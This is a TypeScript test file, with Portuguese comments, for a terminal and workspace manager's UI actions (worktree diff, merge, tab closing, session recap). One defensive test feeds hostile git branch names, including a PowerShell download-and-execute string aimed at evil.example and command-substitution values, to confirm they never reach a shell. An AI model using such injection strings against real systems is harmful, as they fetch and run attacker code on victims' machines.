   * agora"); `revealSession` é o app dizendo "olha esta aqui". Focar um painel
   * cuja linha a sidebar não mostra seria o Bridge apontando pra um lugar que
   * ele mesmo esconde.
   */
  it('workspace RECOLHIDO é aberto antes de ativar a aba e o painel', async () => {
    const { state } = multi();
    const ctx = makeCtx(state, () => ({}), true, null, ['ws-2']);
    expect(workspaceCollapsed(ctx.prefs(), 'ws-2')).toBe(true);

    await revealSession(ctx.deps, 'sess-9');

    expect(ctx.expanded).toEqual(['ws-2']);
    expect(workspaceCollapsed(ctx.prefs(), 'ws-2')).toBe(false);
    expect(ctx.prefs().collapsedWorkspaces).toEqual([]);
    // …e o resto do caminho continua igual.
    expect(ctx.actions).toContainEqual({ type: 'activateTab', workspaceId: 'ws-2', tabId: 'tab-ws-2' });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-9' });
  });

  it('abrir um não mexe nos outros recolhidos', async () => {
    const { state } = multi();
    const ctx = makeCtx(state, () => ({}), true, null, ['ws-1', 'ws-2']);

    await revealSession(ctx.deps, 'sess-9');

    expect(ctx.prefs().collapsedWorkspaces).toEqual(['ws-1']);
  });

  it('workspace já aberto: pede a abertura mesmo assim, e a preferência não muda', async () => {
    const { state } = multi();
    const ctx = makeCtx(state);

    await revealSession(ctx.deps, 'sess-9');

    // A ação não sabe (nem precisa saber) se estava aberto — quem decide não
    // gravar nada é o `expandWorkspace`, que devolve a MESMA preferência.
    expect(ctx.expanded).toEqual(['ws-2']);
    expect(ctx.prefs()).toEqual(EMPTY_GROUP_PREFS);
  });

  it('sessão sem painel conhecido cai no foco simples, sem trocar de workspace', async () => {
    const { state } = multi();
    const ctx = makeCtx(state);

    await revealSession(ctx.deps, 'sess-fantasma');

    expect(ctx.actions).toEqual([{ type: 'focus', sessionId: 'sess-fantasma' }]);
    expect(ctx.actions.reduce(reduce, state).activeWorkspaceId).toBe('ws-1');
    // Sessão que não existe não tem workspace: nada a abrir.
    expect(ctx.expanded).toEqual([]);
  });

  it('sessão SEM painel mas com workspace conhecido ainda abre a linha dela', async () => {
    const { state } = multi();
    const orfa = session({ id: 'sess-orfa', paneId: 'pane-que-sumiu', workspaceId: 'ws-2' });
    const comOrfa = { ...state, sessions: { ...state.sessions, 'sess-orfa': orfa } };
    const ctx = makeCtx(comOrfa, () => ({}), true, null, ['ws-2']);

    await revealSession(ctx.deps, 'sess-orfa');

    expect(ctx.expanded).toEqual(['ws-2']);
    expect(ctx.prefs().collapsedWorkspaces).toEqual([]);
  });
});

describe('workspace.prev / workspace.next', () => {
  const three = (): UiState => stateFrom(layoutWith(['pane-1'], [ws('ws-1'), ws('ws-2'), ws('ws-3')]));

  it('next anda pra frente', async () => {
    const ctx = makeCtx(three());
    makeKeyHandlers(ctx.deps)['workspace.next']?.();
    await tick();
    expect(ctx.actions[0]).toEqual({ type: 'activateWorkspace', id: 'ws-2' });
  });

  it('prev dá a volta pro último', async () => {
    const ctx = makeCtx(three());
    makeKeyHandlers(ctx.deps)['workspace.prev']?.();
    await tick();
    expect(ctx.actions[0]).toEqual({ type: 'activateWorkspace', id: 'ws-3' });
  });

  it('com um workspace só não faz nada', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])));
    makeKeyHandlers(ctx.deps)['workspace.next']?.();
    await tick();
    expect(ctx.actions).toEqual([]);
    expect(ctx.calls).toEqual([]);
  });
});

// ------------------------------------------------------------ worktrees

/** ws-1 é uma tarefa (worktree em cima de `main`), com `paneIds` painéis. */
function taskState(paneIds: string[], sessions: Session[] = []): UiState {
  const layout = layoutWith(paneIds, [worktreeWs('ws-1')]);
  const state = stateFrom(layout, sessions);
  return { ...state, focusedPaneId: paneIds[0] };
}

describe('workspace.diff', () => {
  it('painel livre: sobe um shell com o `git diff` já digitado e foca', async () => {
    const ctx = makeCtx(taskState(['pane-1']), (path, method) =>
      path === '/api/sessions' && method === 'POST' ? session({ id: 'sess-diff', paneId: 'pane-1' }) : {},
    );
    await openDiff(ctx.deps, 'ws-1');

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['POST /api/sessions', 'POST /api/focus']);
    expect(ctx.calls[0]?.body).toEqual({
      paneId: 'pane-1',
      kind: 'shell',
      initialCommand: "git --no-pager diff 'main...HEAD'",
    });
    expect(ctx.actions).toContainEqual({ type: 'activateTab', workspaceId: 'ws-1', tabId: 'tab-1' });
  });

  it('painel ocupado e nenhum livre: divide antes de abrir o diff', async () => {
    const ctx = makeCtx(
      taskState(['pane-1'], [session({ paneId: 'pane-1', state: 'running' })]),
      (path, method) => {
        if (path.includes('/split')) return { id: 'pane-2', tabId: 'tab-1', cwd: 'C:\\projetos\\x' };
        if (path === '/api/sessions' && method === 'POST') return session({ id: 'sess-diff', paneId: 'pane-2' });
        return {};
      },
    );
    await openDiff(ctx.deps, 'ws-1');

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/panes/pane-1/split',
      'POST /api/sessions',
      'POST /api/focus',
    ]);
    expect(ctx.calls[1]?.body).toMatchObject({ paneId: 'pane-2', kind: 'shell' });
  });

  /**
   * BR-04: o `base` vem do disco (nome do branch do worktree principal) ou do
   * banco. O git aceita `;`, `|` e crase em nome de branch, e a linha do "Ver
   * diff" é escrita CRUA num pwsh — um repositório hostil transformava o botão
   * em execução de comando. A UI para ANTES do POST.
   */
  it.each([['main;iwr https://evil.example/x.ps1|iex'], ['a$(calc)b'], ['--upload-pack=x']])(
    'base hostil (%s) não vira initialCommand: nenhum POST sai',
    async (base) => {
      const layout = layoutWith(['pane-1'], [{ ...worktreeWs('ws-1'), worktree: { base, path: 'C:\\projetos\\repo\\.worktrees\\feat-x' } }]);
      const ctx = makeCtx({ ...stateFrom(layout), focusedPaneId: 'pane-1' });

      await openDiff(ctx.deps, 'ws-1');

      expect(ctx.calls).toEqual([]);
      expect(ctx.status[0]).toContain(base);
    },
  );

  it('workspace que não é worktree não tem diff pra mostrar', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])));
    await openDiff(ctx.deps, 'ws-1');
    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Este workspace não é uma tarefa com worktree']);
  });
});

describe('workspace.merge', () => {
  it('fast-forward: confirma, mescla e pede o status novo', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => ({ mode: 'ff-only' }));
    await mergeWorkspace(ctx.deps, 'ws-1');

    expect(ctx.confirms).toEqual(['Mesclar feat-x em main?']);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/workspaces/ws-1/merge',
      'POST /api/workspaces/ws-1/git/refresh',
    ]);
    expect(ctx.calls[0]?.body).toEqual({ mode: 'ff-only' });
    expect(ctx.status).toEqual(['Mesclado em main (fast-forward)']);
  });

  it('não é fast-forward: pergunta de novo e refaz com merge commit', async () => {
    let merges = 0;
    const ctx = makeCtx(taskState(['pane-1']), (path) => {
      if (!path.endsWith('/merge')) return {};
      merges += 1;
      return merges === 1
        ? new ApiError('não é fast-forward', 409, 'not-ff')
        : { mode: 'no-ff', message: 'Merge task/feat-x' };
    });
    await mergeWorkspace(ctx.deps, 'ws-1');

    expect(ctx.confirms).toEqual(['Mesclar feat-x em main?', 'Não é fast-forward. Fazer merge com commit?']);
    expect(ctx.calls.filter((c) => c.path.endsWith('/merge')).map((c) => c.body)).toEqual([
      { mode: 'ff-only' },
      { mode: 'no-ff' },
    ]);
    expect(ctx.status).toEqual(['Mesclado em main com commit de merge']);
  });

  it('recusar a segunda pergunta para tudo — nada é mesclado', async () => {
    const ctx = makeCtx(
      taskState(['pane-1']),
      () => new ApiError('não é fast-forward', 409, 'not-ff'),
      (m) => !m.startsWith('Não é fast-forward'),
    );
    await mergeWorkspace(ctx.deps, 'ws-1');

    expect(ctx.calls.filter((c) => c.path.endsWith('/merge'))).toHaveLength(1);
    expect(ctx.status).toEqual([]);
  });

  it('conflito: a mensagem do core vira linha de status, sem segunda pergunta', async () => {
    const ctx = makeCtx(
      taskState(['pane-1']),
      () => new ApiError('merge deu conflito em src/app.ts', 409, 'conflict'),
    );
    await expect(mergeWorkspace(ctx.deps, 'ws-1')).rejects.toThrow('merge deu conflito');
    expect(ctx.confirms).toHaveLength(1);
  });

  it('base sujo (409): o erro do core sobe pro `run` mostrar', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => new ApiError('o base tem alterações não commitadas', 409, 'dirty-base'));
    await expect(mergeWorkspace(ctx.deps, 'ws-1')).rejects.toThrow('não commitadas');
    expect(ctx.calls.filter((c) => c.path.endsWith('/merge'))).toHaveLength(1);
  });

  it('cancelar a confirmação não chama nada', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => ({ mode: 'ff-only' }), false);
    await mergeWorkspace(ctx.deps, 'ws-1');
    expect(ctx.calls).toEqual([]);
  });
});

describe('workspace.removeWorktree', () => {
  it('confirma e chama DELETE', async () => {
    const ctx = makeCtx(taskState(['pane-1']));
    await removeWorktree(ctx.deps, 'ws-1');
    expect(ctx.confirms).toEqual(['Remover o worktree e o branch feat-x?']);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/workspaces/ws-1/worktree']);
  });

  it('409 explica o que falta, juntando `error` e `detail`', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => new ApiError('o branch feat-x não está mesclado em main', 409, 'not-merged', 'main'));
    await removeWorktree(ctx.deps, 'ws-1');
    expect(ctx.status).toEqual(['o branch feat-x não está mesclado em main · main']);
  });

  it('409 sem detail mostra só a mensagem', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => new ApiError('o worktree tem alterações', 409, 'dirty-worktree'));
    await removeWorktree(ctx.deps, 'ws-1');
    expect(ctx.status).toEqual(['o worktree tem alterações']);
  });

  it('erro que não é 409 sobe pro `run`', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => new ApiError('workspace não encontrado', 404));
    await expect(removeWorktree(ctx.deps, 'ws-1')).rejects.toThrow('workspace não encontrado');
  });

  it('cancelar não remove nada', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => ({}), false);
    await removeWorktree(ctx.deps, 'ws-1');
    expect(ctx.calls).toEqual([]);
  });
});

describe('workspace.openExplorer / closeWorkspace', () => {
  it('abre a pasta do workspace no shell do sistema', () => {
    const ctx = makeCtx(taskState(['pane-1']));
    openWorkspaceFolder(ctx.deps, 'ws-1');
    expect(ctx.openedPaths).toEqual(['C:\\projetos\\repo\\.worktrees\\feat-x']);
  });

  it('workspace inexistente não abre nada', () => {
    const ctx = makeCtx(taskState(['pane-1']));
    openWorkspaceFolder(ctx.deps, 'ws-fantasma');
    expect(ctx.openedPaths).toEqual([]);
  });

  it('fechar workspace confirma antes (o core mata as sessões)', async () => {
    const ctx = makeCtx(taskState(['pane-1']));
    await closeWorkspace(ctx.deps, 'ws-1');
    expect(ctx.confirms).toEqual(['Fechar o workspace ws-1? As sessões vivas dele são encerradas.']);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/workspaces/ws-1']);
  });
});

describe('ações sem rota', () => {
  it('workspace.new e task.new abrem diálogos; sidebar e painel só despacham', () => {
    const ctx = makeCtx(emptyUiState());
    const handlers = makeKeyHandlers(ctx.deps);
    handlers['workspace.new']?.();
    handlers['task.new']?.();
    handlers['sidebar.toggle']?.();
    handlers['notifications.panel']?.();

    expect(ctx.dialogOpened()).toBe(1);
    expect(ctx.taskDialogOpened()).toBe(1);
    expect(ctx.calls).toEqual([]);
    expect(ctx.actions).toEqual([{ type: 'toggleSidebar' }, { type: 'toggleNotifications' }]);
  });

  it('settings.open abre o diálogo de configurações sem tocar em rota', () => {
    const ctx = makeCtx(emptyUiState());
    const handlers = makeKeyHandlers(ctx.deps);
    handlers['settings.open']?.();
    handlers['settings.open']?.();

    // Duas vezes de propósito: não há trava (`run`) aqui, e não deveria haver
    // — abrir diálogo é `setState` idempotente, não pedido ao core.
    expect(ctx.settingsDialogOpened()).toBe(2);
    expect(ctx.calls).toEqual([]);
    expect(ctx.actions).toEqual([]);
  });

  it('cobre as 19 ações da spec', () => {
    const ctx = makeCtx(emptyUiState());
    expect(Object.keys(makeKeyHandlers(ctx.deps))).toHaveLength(19);
  });
});

// ------------------------------------------------- onda final: R2/R3/R4 na UI

describe('mergeWorkspace: decisao por `code` (R2) e base deduzida (R3)', () => {
  it('um `detail` com "not-ff" NAO e mais gatilho: so o `code` conta', async () => {
    const ctx = makeCtx(
      taskState(['pane-1']),
      // Mensagem e detail parecidos com os antigos, `code` de outro erro:
      // a UI nao pode oferecer o merge com commit por causa de texto.
      () => new ApiError('falhou', 409, 'dirty-base', 'not-ff'),
    );
    await expect(mergeWorkspace(ctx.deps, 'ws-1')).rejects.toThrow('falhou');
    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls.filter((c) => c.path.endsWith('/merge'))).toHaveLength(1);
  });

  it('base deduzida aparece no confirm do merge e no da remocao', async () => {
    const state = stateFrom(
      layoutWith(['pane-1'], [
        {
          ...worktreeWs('ws-1'),
          worktree: { base: 'main', path: 'C:\\projetos\\repo\\.worktrees\\feat-x', baseGuessed: true },
        },
      ]),
    );
    const ctx = makeCtx(state, () => ({ mode: 'ff-only' }));
    await mergeWorkspace(ctx.deps, 'ws-1');
    expect(ctx.confirms[0]).toBe('Mesclar feat-x em main (base deduzida)?');

    const ctx2 = makeCtx(state);
    await removeWorktree(ctx2.deps, 'ws-1');
    expect(ctx2.confirms[0]).toContain('(base deduzida: main)');
  });

  it('R4 — o branch do confirm vem do GitStatus, nao do banco', async () => {
    const base = stateFrom(layoutWith(['pane-1'], [worktreeWs('ws-1')]));
    const state = reduce(base, {
      type: 'event',
      event: { type: 'workspace.git', workspaceId: 'ws-1', git: { branch: 'feat-y', base: 'main', ahead: 1, dirty: 0, at: 5 } },
    });
    const ctx = makeCtx(state, () => ({ mode: 'ff-only' }));
    await mergeWorkspace(ctx.deps, 'ws-1');
    expect(ctx.confirms[0]).toBe('Mesclar feat-y em main?');
  });
});

describe('setWorktreeBase (R3, "Definir base…")', () => {
  it('manda PATCH com o base digitado e avisa no rodape', async () => {
    const ctx = makeCtx(taskState(['pane-1']), () => ({}), true, 'dev');
    await setWorktreeBase(ctx.deps, 'ws-1');

    expect(ctx.prompts[0]).toContain('Base de feat-x');
    expect(ctx.calls).toEqual([
      { path: '/api/workspaces/ws-1/worktree', method: 'PATCH', body: { base: 'dev' } },
    ]);
    expect(ctx.status).toEqual(['Base de feat-x agora é dev']);
  });

  it('cancelar o prompt, deixar vazio ou repetir o base atual nao chama nada', async () => {
    for (const answer of [null, '   ', 'main']) {
      const ctx = makeCtx(taskState(['pane-1']), () => ({}), true, answer);
      await setWorktreeBase(ctx.deps, 'ws-1');
      expect(ctx.calls).toEqual([]);
    }
  });

  it('ref inexistente (422 unknown-ref) vira linha de status, nao excecao', async () => {
    const ctx = makeCtx(
      taskState(['pane-1']),
      () => new ApiError('o ref nao-existe não existe neste repositório', 422, 'unknown-ref'),
      true,
      'nao-existe',
    );
    await setWorktreeBase(ctx.deps, 'ws-1');
    expect(ctx.status).toEqual(['o ref nao-existe não existe neste repositório']);
  });

  it('workspace comum nem chega a perguntar', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), () => ({}), true, 'dev');
    await setWorktreeBase(ctx.deps, 'ws-1');
    expect(ctx.prompts).toEqual([]);
    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Este workspace não é uma tarefa com worktree']);
  });
});

// --------------------------------------------------------- fechar aba

/** Um workspace com a aba de terminal de sempre mais uma aba vazia (sem painel). */
function layoutWithEmptyTab(): LayoutSnapshot {
  const base = layoutWith(['pane-1']);
  return {
    ...base,
    tabs: [...base.tabs, { id: 'tab-b', workspaceId: 'ws-1', title: 'Terminal', kind: 'terminal', order: 1 }],
  };
}

describe('tab.close numa aba sem sessão', () => {
  it('fecha direto, sem confirmação (não tem sessão pra perder)', async () => {
    const state = reduce(stateFrom(layoutWithEmptyTab()), { type: 'activateTab', workspaceId: 'ws-1', tabId: 'tab-b' });
    const ctx = makeCtx(state);
    makeKeyHandlers(ctx.deps)['tab.close']?.();
    await tick();

    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-b']);
  });

  it('o ✕ da barra de abas fecha a aba apontada, não a ativa', async () => {
    const ctx = makeCtx(stateFrom(layoutWithEmptyTab()));
    await closeTabById(ctx.deps, 'tab-b');
    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-b']);
  });

  it('o mesmo ✕ numa aba de terminal com sessão viva continua perguntando', async () => {
    const ctx = makeCtx(stateFrom(layoutWithEmptyTab(), [session({ paneId: 'pane-1', state: 'running' })]));
    await closeTabById(ctx.deps, 'tab-1');
    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-1']);
  });
});

// ------------------------ dor #1: o 202 do escalonador de lançamentos

/**
 * `POST /api/sessions` deixou de responder só 201: com o escalonador ligado e
 * a rajada em curso, ele responde **202** e a sessão nasce depois. A UI não
 * pode tratar isso como sessão — `session.id` viria `undefined` e o foco iria
 * pra lugar nenhum.
 */
describe('createSessionInPane com a fila do escalonador', () => {
  it('201: foca a sessão nova, como sempre', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path === '/api/sessions' ? session({ id: 'sess-nova' }) : {},
    );
    await createSessionInPane(ctx.deps, 'pane-1', 'agent', 'claude');
    expect(ctx.actions).toContainEqual({ type: 'focus', sessionId: 'sess-nova' });
    expect(ctx.calls.map((c) => c.path)).toContain('/api/focus');
  });

  it('202: não foca nada e conta a posição na faixa de status', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path === '/api/sessions' ? { queued: true, id: 'lnch_1', position: 2, reason: 'slots' } : {},
    );
    await createSessionInPane(ctx.deps, 'pane-1', 'agent', 'claude');
    expect(ctx.actions.some((a) => a.type === 'focus')).toBe(false);
    // Nenhum `POST /api/focus`: não há sessão pra focar ainda.
    expect(ctx.calls.map((c) => c.path)).toEqual(['/api/sessions']);
    expect(ctx.status).toContain(queuedMessage(2, PT));
  });
});

// ---------------------- dor #3: "Reabrir com contexto" (o resume vazio)

describe('reopenWithRecap', () => {
  it('pede o resumo e escreve o texto no PTY, com UM Enter no fim', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path.endsWith('/recap') ? { text: 'Último pedido seu: conserta o poller' } : {},
    );
    await reopenWithRecap(ctx.deps, 'sess-1');

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/sessions/sess-1/recap',
      'POST /api/sessions/sess-1/input',
    ]);
    const data = (ctx.calls[1]?.body as { data: string }).data;
    expect(data).toBe(recapInput('Último pedido seu: conserta o poller', PT));
    expect(data.endsWith('\r')).toBe(true);
    expect(data.slice(0, -1)).not.toMatch(/[\r\n]/);
  });

  it('resumo que falhou não escreve nada no terminal', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path.endsWith('/recap') ? new ApiError('o transcript da conversa anterior não está mais no disco', 404) : {},
    );
    await expect(reopenWithRecap(ctx.deps, 'sess-1')).rejects.toThrow();
    expect(ctx.calls.map((c) => c.path)).toEqual(['/api/sessions/sess-1/recap']);
  });

  // O motivo que o core devolve é um FRAGMENTO ("o transcript … não está mais
  // no disco"). Sozinho na linha de status ele não diz de que pedido é — o
  // `recapFailureMessage` é o que o transforma em frase, e o `run` só mostra
  // `err.message`. Sem esta asserção o wrapper volta a ser código morto.
  it('a falha sobe com a frase do recapFailureMessage, e o status/código da rota sobrevivem', async () => {
    const motivo = 'o transcript da conversa anterior não está mais no disco';
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path.endsWith('/recap') ? new ApiError(motivo, 404, 'transcript-not-found') : {},
    );
    const err = await reopenWithRecap(ctx.deps, 'sess-1').catch((e: unknown) => e);
    expect(err).toBeInstanceOf(ApiError);
    const api = err as ApiError;
    expect(api.message).toBe(recapFailureMessage(new Error(motivo), PT));
    expect(api.message).toContain('Não deu pra montar o resumo da conversa anterior');
    expect(api.message).toContain(motivo);
    expect(api.status).toBe(404);
    expect(api.code).toBe('transcript-not-found');
    // Nada foi escrito no PTY: a falha é do resumo, não do terminal.
    expect(ctx.calls.map((c) => c.path)).toEqual(['/api/sessions/sess-1/recap']);
  });
});
